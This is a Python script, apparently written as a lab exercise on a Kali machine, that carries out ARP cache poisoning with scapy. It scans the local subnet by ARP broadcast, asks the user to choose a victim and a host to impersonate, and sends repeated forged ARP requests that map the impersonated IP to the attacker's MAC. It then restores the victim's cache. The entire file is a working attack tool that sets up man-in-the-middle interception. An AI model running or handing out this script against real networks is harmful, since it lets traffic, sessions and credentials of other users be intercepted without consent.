from scapy.all import *
import ipaddress
from scapy.arch import get_if_hwaddr, get_if_addr
from scapy.config import conf
from scapy.data import ETHER_BROADCAST
from scapy.layers.l2 import Ether, ARP, arpcachepoison
from scapy.sendrecv import srp, sendp


ARP_TEMPLATE = (Ether(dst=ETHER_BROADCAST) / ARP())
print(conf.ifaces)
interface_selection = input("Select the network interface you wish to poison with")
conf.iface = conf.ifaces.dev_from_index(interface_selection)
# get self IP and MAC address from get_if_addr, use conf.ifaces.dev_from_index as default network interface
KALI_MAC = get_if_hwaddr(conf.iface)
KALI_IP = get_if_addr(conf.iface)
INVALID_ADDRESS = [1, 2, 254, 255]


# wanted to use ARP ping to get IP address of devices, but it seems got problem calling my own IP address through python
def get_network_address(ip: str, prefix: int = 24) -> str:
    """
    mini function to split an IP address and return the subnet, for use in ARP broadcast ping
    """
    network = ipaddress.IPv4Network(f"{ip}/{prefix}", strict=False)
    return str(network)


def arp_ping():
    """
    Use ARP ping broadcast on layer 2 to receive back a list of listening devices, their IP address and MAC address for checking if the target device is on the network and for restoring the ARP later.
    :return:
    """
    ip_addr_list = []
    kali_network_addr = get_network_address(KALI_IP)
    ans, unans = srp(Ether(dst=ETHER_BROADCAST) / ARP(pdst=kali_network_addr), timeout=2)
    # ARP broadcast ping to request ARP (mac addr) for all IP on the network address
    for packet in ans:
        valid_ip_address = packet.answer.psrc
        valid_mac_address = packet.answer.hwsrc
        ip_mac_pair = (valid_ip_address, valid_mac_address)
        last_octet = int(valid_ip_address.split(".")[-1])
        # check if ip address does not end with 1, 2, 254, or 255
        if last_octet not in INVALID_ADDRESS:
            ip_addr_list.append(ip_mac_pair)
    ip_add_list_no_dupes = list(set(ip_addr_list))
    return ip_add_list_no_dupes


def arp_poison(target_to_poison, spoof_target):
    """
    function to take in two IP addresses and create an ARP poison packet to poison a target's ARP cache and masquerade
    :return:
    """
    print(f"poisoning {target_to_poison} in the list as {spoof_target}, press ctrl + C to stop")
    # to emulate the function of arpcachepoison without using the function, we send ARP request to the target masquerading as the spoof, but with my own kali mac address
    # broadcast to all devices on layer 2
    e = Ether(dst=ETHER_BROADCAST)
    # craft malicious ARP packet: op 1 for ARP request, hwsrc: kali mac, psrc: spoof_target_IP, hwdst: broadcast, pdst: IP of target to poison
    a = ARP(op=1, hwsrc=KALI_MAC, psrc=spoof_target, hwdst=ETHER_BROADCAST, pdst=target_to_poison)
    poison_packet = e / a
    sendp(poison_packet, inter=1, loop=1, count=200)



def arp_restore(target_ip, restore_ip, restore_mac):
    """
    function to restore ARP cache of poisoned target
    :param target_ip:
    :param restore_ip:
    :param restore_mac:
    :return:
    """
    print(f"restoring {target_ip}'s ARP with {restore_ip}, {restore_mac}..")
    e = Ether(dst=ETHER_BROADCAST)
    a = ARP(op=1, hwsrc=restore_mac, psrc=restore_ip, hwdst=ETHER_BROADCAST, pdst=target_ip)
    restore_packet = e / a
    sendp(restore_packet)


def main():
    print("kali IP:", KALI_IP)
    print("kali MAC:", KALI_MAC)
    list_of_target_ip = arp_ping()
    # get list of devices on the network with ARP ping
    print(list_of_target_ip)
    # print a list of ip - mac addresses acquired on the target network
    target_id = int(input("select a target IP to poison"))
    target_ip = (list_of_target_ip[target_id])[0]
    print(list_of_target_ip)
    spoof_id = int(input("select a target IP to spoof as"))
    spoof_ip = (list_of_target_ip[spoof_id])[0]
    spoof_mac = (list_of_target_ip[spoof_id])[1]
    arp_poison(target_ip, spoof_ip)
    input("Poisoning, press enter to restore target IP")
    arp_restore(target_ip, spoof_ip, spoof_mac)
    print(list_of_target_ip)



if __name__ == "__main__":
    main()
